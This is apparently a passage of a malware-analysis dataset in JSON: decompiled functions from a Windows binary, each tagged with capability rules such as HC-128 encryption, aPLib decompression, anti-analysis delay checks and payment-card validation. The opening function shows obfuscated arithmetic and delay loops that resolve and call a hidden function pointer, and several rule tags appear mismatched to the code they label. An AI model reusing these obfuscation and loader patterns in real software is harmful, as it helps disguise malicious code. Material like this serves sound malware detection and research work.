-0x272178b4;\n        *(unaff_EBP + -0x138) = *(unaff_EBP + -0x138) + 0x3d55148e;\n        *(unaff_EBP + -0x138) = *(unaff_EBP + -0x138) + -0x4586f4ec;\n        *(unaff_EBP + -0x138) = *(unaff_EBP + -0x138) + 0x4586f4ec;\n        *(unaff_EBP + -0x138) = *(unaff_EBP + -0x138) + -0x73a6d6a8;\n        *0x4b73f0 = *(unaff_EBP + -0x138);\n        *0x4aceab = 0x74;\n        *(unaff_EBP + -0x170) = 0xdab62c38;\n        *(unaff_EBP + -0x170) = *(unaff_EBP + -0x170) + 0x2549d3c8;\n        *(unaff_EBP + -0x170) = *(unaff_EBP + -0x170) + -0x4c4c5c38;\n        *(unaff_EBP + -0x170) = *(unaff_EBP + -0x170) + 0x4c4c5c38;\n        *(unaff_EBP + -0x170) = *(unaff_EBP + -0x170) + -0x3bd6930c;\n        *(unaff_EBP + -0x170) = *(unaff_EBP + -0x170) + -0x1a93dd66;\n        *(unaff_EBP + -0x170) = *(unaff_EBP + -0x170) + -0x4aa1642;\n        *(unaff_EBP + -0x170) = *(unaff_EBP + -0x170) + -0x177fcd5c;\n        *(unaff_EBP + -0x170) = *(unaff_EBP + -0x170) + 0x43f32ca0;\n        *(unaff_EBP + -0x170) = *(unaff_EBP + -0x170) + -0x30d51776;\n        *(unaff_EBP + -0x170) = *(unaff_EBP + -0x170) + 0x511e17b8;\n        *(unaff_EBP + -0x170) = *(unaff_EBP + -0x170) + 0xe58272e;\n        *(unaff_EBP + -0x170) = *(unaff_EBP + -0x170) + -0x4d9c1dc0;\n        *(unaff_EBP + -0x170) = *(unaff_EBP + -0x170) + 0x24350954;\n        *0x442360 = *(unaff_EBP + -0x170);\n        *0x4aceaf = 0x50;\n        *(unaff_EBP + -0x14c) = 0;\n        *(unaff_EBP + -0x14c) = *(unaff_EBP + -0x14c) + -0xfc2aa80;\n        *(unaff_EBP + -0x14c) = *(unaff_EBP + -0x14c) + 0xbf9b766;\n        *(unaff_EBP + -0x14c) = *(unaff_EBP + -0x14c) + 0x3c8f31a;\n        *(unaff_EBP + -0x14c) = *(unaff_EBP + -0x14c) + -0x24dd97fc;\n        *(unaff_EBP + -0x14c) = *(unaff_EBP + -0x14c) + 0x24dd97fc;\n        *0x4b7570 = *(unaff_EBP + -0x14c);\n        *0x4b7574 = *0x4b7570 >> 0x1f;\n        *0x4acea9 = 0x69;\n        *(unaff_EBP + -0x180) = 0xe6a26a58;\n        *(unaff_EBP + -0x180) = *(unaff_EBP + -0x180) + 0x195d95a8;\n        *(unaff_EBP + -0x180) = *(unaff_EBP + -0x180) + -0x2bb36776;\n        *0x4b50b8 = *(unaff_EBP + -0x180);\n        *0x4aceac = 0x75;\n        *(unaff_EBP + -0x168) = 0xe5519bc2;\n        *(unaff_EBP + -0x168) = *(unaff_EBP + -0x168) + 0x1aae643e;\n        *(unaff_EBP + -0x168) = *(unaff_EBP + -0x168) + -0x1561c6ce;\n        *(unaff_EBP + -0x168) = *(unaff_EBP + -0x168) + 0x1561c6ce;\n        *(unaff_EBP + -0x168) = *(unaff_EBP + -0x168) + -0x60e98df2;\n        *0x4b26b0 = *(unaff_EBP + -0x168);\n        *0x4b26b4 = *0x4b26b0 >> 0x1f;\n        *0x4aceb6 = 0;\n        iVar4 = 0;\n        do {\n            if (iVar4 == 0x112f38) {\n                *0x4af09c = (*pcVar1)(*0x4b7478, 0x4acea8);\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x43827a);\n        iVar4 = 0;\n        do {\n            if (iVar4 == 0xed654) {\n                (**0x4af09c)(*0x4b5030, *0x4b90e4, *(unaff_EBP + -0xd8), unaff_EBP + -0x1c4);\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x2d7510);\n        uVar3 = fcn.004025f5(0x440120);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar3;\n}\n",
        "token_count": 27838
    },
    "004022f8": {
        "rules": [
            "encrypt data using HC-128/b24f3f77371449e18042164d6f6569c2"
        ],
        "decompiled_code": "\nuint32_t fcn.004022f8(void)\n\n{\n    uint lpFilename;\n    uint var_54h;\n    uint var_38h;\n    uint var_34h;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x4b5048 = 0;\n    if (*0x4b90e4 == 0x13d4) {\n        var_8h = *0x4b5048;\n        (*_sym.imp.KERNEL32.dll_DeleteTimerQueueTimer)(0, 0, 0);\n        var_38h = 0;\n        var_34h = 0;\n        uStack52 = 0;\n        uStack48 = 0;\n        uStack44 = 0;\n        (*_sym.imp.KERNEL32.dll_BuildCommDCBAndTimeoutsA)(\"putubumasajikiwe rojugumuku\", &var_54h, &var_38h);\n        (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, &lpFilename, 0);\n        (*_sym.imp.KERNEL32.dll_OpenFileMappingW)\n                  (0, 0, \n                   L\"nemagigunafapanuxerulimemoyiro noviwiropikibo badanobobuzige pevurupulahatasisuxezabimobi netopora\"\n                  );\n        *0x4b48b0 = 0x9c9f9508;\n        *0x4b48b4 = 0xffffffff;\n    }\n    if (*0x4b90e4 == 0x82b) {\n        *0x4563b8 = 0;\n    }\n    *0x4b2678 = *0x4b2678 * 0x343fd + 0x269ec3;\n    *0x4563c4 = 0;\n    *0x4b5050 = 0xf71ca014;\n    *0x4b5054 = 0xffffffff;\n    *0x4b7438 = 0x8f9ea07e;\n    *0x4b743c = 0xffffffff;\n    return *0x4b2678 >> 0x10 & 0x7fff;\n}\n",
        "token_count": 556
    },
    "004087d0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n\nvoid fcn.004087d0(void)\n\n{\n    uint32_t arg_ch;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t extraout_ECX;\n    int32_t iVar7;\n    int32_t extraout_ECX_00;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch_2;\n    uint var_10h_2;\n    uint var_14h;\n    uint var_10h;\n    uint var_34h;\n    uint var_18h;\n    uint var_14h_2;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00409df4();\n    *(unaff_EBP + -0x10) = &stack0xffffffcc;\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    uVar2 = fcn.00404fa6();\n    arg_ch = *(unaff_EBP + 0x10);\n    if (arg_ch != 0) {\n        iVar3 = (*(extraout_ECX + 0x10) - *(extraout_ECX + 0xc)) / 0x1c;\n        iVar7 = 0x9249249;\n        if (0x9249249U - iVar3 < arg_ch) {\n            iVar3 = fcn.00406edb();\n            iVar7 = extraout_ECX_00;\n        }\n        uVar4 = iVar3 + arg_ch;\n        if (uVar2 < uVar4) {\n            if (iVar7 - (uVar2 >> 1) < uVar2) {\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = uVar2 + (uVar2 >> 1);\n            }\n            if (uVar2 < uVar4) {\n                uVar2 = uVar4;\n            }\n            uVar5 = fcn.004051a2();\n            *(unaff_EBP + 0x10) = uVar5;\n            *(unaff_EBP + -0x14) = uVar5;\n            *(unaff_EBP + -4) = 0;\n            uVar5 = fcn.00408690(*(extraout_ECX + 0xc), *(unaff_EBP + 0xc), uVar5);\n            *(unaff_EBP + -0x14) = uVar5;\n            uVar5 = fcn.00408107(uVar5, arg_ch, *(unaff_EBP + 0x14));\n            *(unaff_EBP + -0x14) = uVar5;\n            fcn.00408690(*(unaff_EBP + 0xc), *(extraout_ECX + 0x10), uVar5);\n            *(unaff_EBP + -4) = 0xffffffff;\n            iVar7 = *(extraout_ECX + 0xc);\n            iVar3 = *(extraout_ECX + 0x10);\n            if (*(extraout_ECX + 0xc) != 0) {\n                fcn.0040778b(*(extraout_ECX + 0xc), *(extraout_ECX + 0x10));\n                fcn.00409e64(*(extraout_ECX + 0xc));\n            }\n            iVar1 = *(unaff_EBP + 0x10);\n            *(extraout_ECX + 0x14) = uVar2 * 0x1c + iVar1;\n            *(extraout_ECX + 0x10) = (arg_ch + (iVar3 - iVar7) / 0x1c) * 0x1c + iVar1;\n            *(extraout_ECX + 0xc) = iVar1;\n        }\n        else {\n            if ((*(extraout_ECX + 0x10) - *(unaff_EBP + 0xc)) / 0x1c < arg_ch) {\n                fcn.00406b0c(*(unaff_EBP + 0x14));\n                *(unaff_EBP + -4) = 2;\n                fcn.00408690(*(unaff_EBP + 0xc), *(extraout_ECX + 0x10), arg_ch * 0x1c + *(unaff_EBP + 0xc));\n                *(unaff_EBP + -4) = 3;\n                fcn.00408107(*(extraout_ECX + 0x10), arg_ch - (*(extraout_ECX + 0x10) - *(unaff_EBP + 0xc)) / 0x1c, \n                             unaff_EBP + -0x34);\n                *(unaff_EBP + -4) = 2;\n                *(extraout_ECX + 0x10) = *(extraout_ECX + 0x10) + arg_ch * 0x1c;\n                fcn.00406b95(*(unaff_EBP + 0xc), *(extraout_ECX + 0x10) + arg_ch * -0x1c, unaff_EBP + -0x34);\n            }\n            else {\n                fcn.00406b0c(*(unaff_EBP + 0x14));\n                *(unaff_EBP + -4) = 5;\n                uVar5 = *(extraout_ECX + 0x10);\n                *(unaff_EBP + 0x14) = uVar5;\n                *(unaff_EBP + 0x14) = *(unaff_EBP + 0x14) + arg_ch * -0x1c;\n                uVar6 = fcn.00408690(*(unaff_EBP + 0x14), uVar5, uVar5);\n                *(extraout_ECX + 0x10) = uVar6;\n                fcn.004086a9(*(unaff_EBP + 0xc), *(unaff_EBP + 0x14), uVar5);\n                fcn.00406b95(*(unaff_EBP + 0xc), arg_ch * 0x1c + *(unaff_EBP + 0xc), unaff_EBP + -0x34);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00405fd6(1, 0);\n        }\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 1434
    },
    "00404efc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404efc(int32_t *param_1)\n\n{\n    code **arg_8h;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    \n    *(*(*param_1 + 4) + param_1) = vtable.std::basic_ostream_char__struct_std::char_traits_char__.0;\n    fcn.00409df4();\n    *(unaff_EBP + -0x10) = arg_8h;\n    *arg_8h = vtable.std::basic_ios_char__struct_std::char_traits_char__.0;\n    *(unaff_EBP + -4) = 0xffffffff;\n    *arg_8h = vtable.std::ios_base.0;\n    fcn.00409513(arg_8h);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 193
    },
    "00404f11": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404f11(int32_t *param_1)\n\n{\n    code **arg_8h;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    \n    *(*(*param_1 + 4) + param_1) = vtable.std::basic_istream_char__struct_std::char_traits_char__.0;\n    fcn.00409df4();\n    *(unaff_EBP + -0x10) = arg_8h;\n    *arg_8h = vtable.std::basic_ios_char__struct_std::char_traits_char__.0;\n    *(unaff_EBP + -4) = 0xffffffff;\n    *arg_8h = vtable.std::ios_base.0;\n    fcn.00409513(arg_8h);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 193
    },
    "0040511b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040511b(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t **in_ECX;\n    int32_t *piVar3;\n    \n    piVar1 = *in_ECX;\n    if (piVar1 == NULL) {\n        fcn.0040a0a6();\n        piVar1 = *in_ECX;\n        if (piVar1 != NULL) goto code_r0x00405133;\n        iVar2 = 0;\n    }\n    else {\ncode_r0x00405133:\n        iVar2 = *piVar1;\n    }\n    piVar3 = in_ECX[1] + arg_8h * 7;\n    if (piVar3 < *(iVar2 + 0x10) || piVar3 == *(iVar2 + 0x10)) {\n        if (piVar1 == NULL) {\n            iVar2 = 0;\n        }\n        else {\n            iVar2 = *piVar1;\n        }\n        if (*(iVar2 + 0xc) <= piVar3) goto code_r0x0040515d;\n    }\n    fcn.0040a0a6();\ncode_r0x0040515d:\n    in_ECX[1] = in_ECX[1] + arg_8h * 7;\n    return;\n}\n",
        "token_count": 303
    },
    "00405ae6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405ae6(uint32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t iVar1;\n    \n    if (*(in_ECX + 0x14) <= arg_8h && arg_8h != *(in_ECX + 0x14)) {\n        fcn.0040a0a6();\n    }\n    if (*(in_ECX + 0x18) < 0x10) {\n        iVar1 = in_ECX + 4;\n    }\n    else {\n        iVar1 = *(in_ECX + 4);\n    }\n    return iVar1 + arg_8h;\n}\n",
        "token_count": 145
    },
    "00405bd2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.00405bd2(void)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_1ch;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00409df4();\n    *(unaff_EBP + -0x10) = &stack0xffffffe4;\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    puVar1 = fcn.0040a29a();\n    *(extraout_ECX + 8) = 0;\n    *(extraout_ECX + 0x10) = 0;\n    *(extraout_ECX + 0x14) = 0;\n    *(unaff_EBP + -4) = 0;\n    fcn.004010dd(unaff_EBP + -0x1c);\n    uVar2 = fcn.00405b7b(puVar1[2]);\n    *(extraout_ECX + 8) = uVar2;\n    fcn.004010dd(unaff_EBP + -0x1c);\n    uVar2 = fcn.00405b7b(\"false\");\n    *(extraout_ECX + 0x10) = uVar2;\n    fcn.004010dd(unaff_EBP + -0x1c);\n    uVar2 = fcn.00405b7b(\"true\");\n    *(extraout_ECX + 0x14) = uVar2;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0040903b();\n    *(extraout_ECX + 0xc) = **puVar1;\n    fcn.0040903b();\n    *(extraout_ECX + 0xd) = *puVar1[1];\n    if (*(unaff_EBP + 0xc) != '\\0') {\n        fcn.0040903b();\n        uVar2 = fcn.00405b7b(0x41d885);\n        *(extraout_ECX + 8) = uVar2;\n        fcn.0040903b();\n        *(extraout_ECX + 0xc) = 0x2e;\n        fcn.0040903b();\n        *(extraout_ECX + 0xd) = 0x2c;\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 605
    },
    "004065a3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004065a3(uint32_t arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    int32_t arg_8h_00;\n    \n    if (-*(in_ECX + 0x14) - 1U <= arg_8h) {\n        fcn.004096fe();\n    }\n    if (arg_8h != 0) {\n        arg_8h_00 = *(in_ECX + 0x14) + arg_8h;\n        cVar1 = fcn.004064c5(arg_8h_00, 0);\n        if (cVar1 != '\\0') {\n            fcn.00405b31(*(in_ECX + 0x14), arg_8h, arg_ch);\n            fcn.004058ee(arg_8h_00);\n        }\n    }\n    return;\n}\n",
        "token_count": 201
    },
    "004066c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004066c0(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t arg_8h_00;\n    int32_t in_ECX;\n    int32_t iVar3;\n    \n    if (*(arg_8h + 0x14) < arg_ch) {\n        fcn.00409736();\n    }\n    uVar2 = *(arg_8h + 0x14) - arg_ch;\n    if (uVar2 < arg_10h) {\n        arg_10h = uVar2;\n    }\n    if ((-*(in_ECX + 0x14) - 1U <= arg_10h) || (*(in_ECX + 0x14) + arg_10h < *(in_ECX + 0x14))) {\n        fcn.004096fe();\n    }\n    if (arg_10h != 0) {\n        arg_8h_00 = *(in_ECX + 0x14) + arg_10h;\n        cVar1 = fcn.004064c5(arg_8h_00, 0);\n        if (cVar1 != '\\0') {\n            if (*(arg_8h + 0x18) < 0x10) {\n                arg_8h = arg_8h + 4;\n            }\n            else {\n                arg_8h = *(arg_8h + 4);\n            }\n            if (*(in_ECX + 0x18) < 0x10) {\n                iVar3 = in_ECX + 4;\n            }\n            else {\n                iVar3 = *(in_ECX + 4);\n            }\n            fcn.00401082(*(in_ECX + 0x14) + iVar3, *(in_ECX + 0x18) - *(in_ECX + 0x14), arg_8h + arg_ch, arg_10h);\n            fcn.004058ee(arg_8h_00);\n        }\n    }\n    return;\n}\n",
        "token_count": 461
    },
    "00406944": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406944(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    int32_t arg_8h_00;\n    int32_t in_ECX;\n    uint32_t arg_8h_01;\n    \n    if (*(arg_8h + 0x14) < arg_ch) {\n        fcn.00409736();\n    }\n    arg_8h_01 = *(arg_8h + 0x14) - arg_ch;\n    if (arg_10h < arg_8h_01) {\n        arg_8h_01 = arg_10h;\n    }\n    if (in_ECX == arg_8h) {\n        fcn.00406021(arg_8h_01 + arg_ch, 0xffffffff);\n        fcn.00406021(0, arg_ch);\n    }\n    else {\n        cVar1 = fcn.004064c5(arg_8h_01, 0);\n        if (cVar1 != '\\0') {\n            if (*(arg_8h + 0x18) < 0x10) {\n                arg_8h = arg_8h + 4;\n            }\n            else {\n                arg_8h = *(arg_8h + 4);\n            }\n            if (*(in_ECX + 0x18) < 0x10) {\n                arg_8h_00 = in_ECX + 4;\n            }\n            else {\n                arg_8h_00 = *(in_ECX + 4);\n            }\n            fcn.00401082(arg_8h_00, *(in_ECX + 0x18), arg_8h + arg_ch, arg_8h_01);\n            fcn.004058ee(arg_8h_01);\n        }\n    }\n    return;\n}\n",
        "token_count": 411
    },
    "00406ae4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406ae4(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    for (; arg_8h != arg_ch; arg_8h = arg_8h + 0x1c) {\n        fcn.00406944(arg_8h, 0, 0xffffffff);\n        arg_10h = arg_10h + 0x1c;\n    }\n    return arg_10h;\n}\n",
        "token_count": 110
    },
    "00406b56": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406b56(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00406ae4(arg_8h, arg_ch, arg_10h);\n    return ((arg_ch - arg_8h) / 0x1c) * 0x1c + arg_10h;\n}\n",
        "token_count": 103
    },
    "00406b95": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406b95(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    for (; arg_8h != arg_ch; arg_8h = arg_8h + 0x1c) {\n        fcn.00406944(arg_10h, 0, 0xffffffff);\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "00406d36": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00406d36(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00409df4();\n    *(unaff_EBP + -0x10) = 0;\n    fcn.00406b0c(*extraout_ECX + 0x18);\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = 1;\n    uVar1 = *(unaff_EBP + 8);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar1;\n}\n",
        "token_count": 198
    },
    "00406f14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\ncode ** __cdecl fcn.00406f14(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00409df4();\n    arg_8h_00 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.004098ef(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = vtable.std::logic_error.0;\n    fcn.00406b0c(arg_8h_00 + 0xc);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 267
    },
    "004070dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004070dd(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    fcn.00406b56(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 60
    },
    "00407292": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407292(int32_t param_1, int32_t param_2)\n\n{\n    for (; param_1 != param_2; param_1 = param_1 + 0x1c) {\n        fcn.00406767(0);\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "0040733d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\ncode ** __cdecl fcn.0040733d(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00409df4();\n    arg_8h_00 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.004098ef(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = vtable.std::runtime_error.0;\n    fcn.00406b0c(arg_8h_00 + 0xc);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 267
    },
    "00407422": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407422(uint32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    \n    *(in_ECX + 0xc) = 0;\n    *(in_ECX + 0x10) = 0;\n    *(in_ECX + 0x14) = 0;\n    if (arg_8h == 0) {\n        uVar1 = 0;\n    }\n    else {\n        if (0x9249249 < arg_8h) {\n            fcn.00406edb();\n        }\n        iVar2 = fcn.004051a2();\n        *(in_ECX + 0xc) = iVar2;\n        *(in_ECX + 0x10) = iVar2;\n        *(in_ECX + 0x14) = arg_8h * 0x1c + iVar2;\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 219
    },
    "0040766f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n\nint32_t fcn.0040766f(void)\n\n{\n    int32_t extraout_ECX;\n    int32_t extraout_EDX;\n    int32_t unaff_EBP;\n    int32_t iVar1;\n    int32_t arg_8h;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_34h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00409df4();\n    *(unaff_EBP + -0x10) = &stack0xffffffcc;\n    iVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x14) = iVar1;\n    *(unaff_EBP + -0x1c) = 0xf;\n    fcn.004058ee(0);\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -4) = 1;\n    arg_8h = extraout_ECX;\n    while (arg_8h != extraout_EDX) {\n        fcn.00406bb7();\n        fcn.00406be7(arg_8h);\n        iVar1 = iVar1 + 0x1c;\n        *(unaff_EBP + 8) = iVar1;\n        arg_8h = arg_8h + 0x1c;\n        *(unaff_EBP + -0x18) = arg_8h;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00405fd6(1, 0);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar1;\n}\n",
        "token_count": 410
    },
    "0040778b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040778b(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    \n    fcn.00407292(in_ECX + 8, arg_ch);\n    return;\n}\n",
        "token_count": 52
    },
    "00407fdb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407fdb(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint noname_3, uint arg_18h)\n\n{\n    uint var_4h;\n    \n    fcn.0040770a(arg_8h, arg_ch, arg_10h);\n    return arg_10h + ((arg_ch - arg_8h) / 0x1c) * -0x1c;\n}\n",
        "token_count": 107
    },
    "00408081": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408081(int32_t param_1)\n\n{\n    int32_t arg_ch;\n    \n    arg_ch = *(param_1 + 0x10);\n    if ((arg_ch - *(param_1 + 0xc)) / 0x1c != 0) {\n        fcn.0040778b(arg_ch + -0x1c, arg_ch);\n        *(param_1 + 0x10) = *(param_1 + 0x10) + -0x1c;\n    }\n    return;\n}\n",
        "token_count": 121
    },
    "004080aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004080aa(int32_t arg_8h, uint noname_1, uint arg_10h, uint noname_3, uint arg_18h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = in_ECX;\n    fcn.00406525(arg_10h, in_ECX);\n    fcn.00406322(arg_18h, in_ECX);\n    cVar1 = fcn.00405964(&var_8h);\n    if (cVar1 != '\\0') {\n        arg_8h_00 = fcn.004070dd(var_4h, *(in_ECX + 0x10), *(arg_8h + 4));\n        fcn.0040778b(arg_8h_00, *(in_ECX + 0x10));\n        *(in_ECX + 0x10) = arg_8h_00;\n    }\n    return arg_8h;\n}\n",
        "token_count": 247
    },
    "00408107": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408107(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    fcn.00407f99(arg_10h, in_ECX + 8);\n    return arg_ch * 0x1c + arg_8h;\n}\n",
        "token_count": 79
    },
    "00408690": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408690(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    fcn.00407fba(arg_10h, in_ECX + 8);\n    return;\n}\n",
        "token_count": 60
    },
    "004086a9": {
        "rules": [
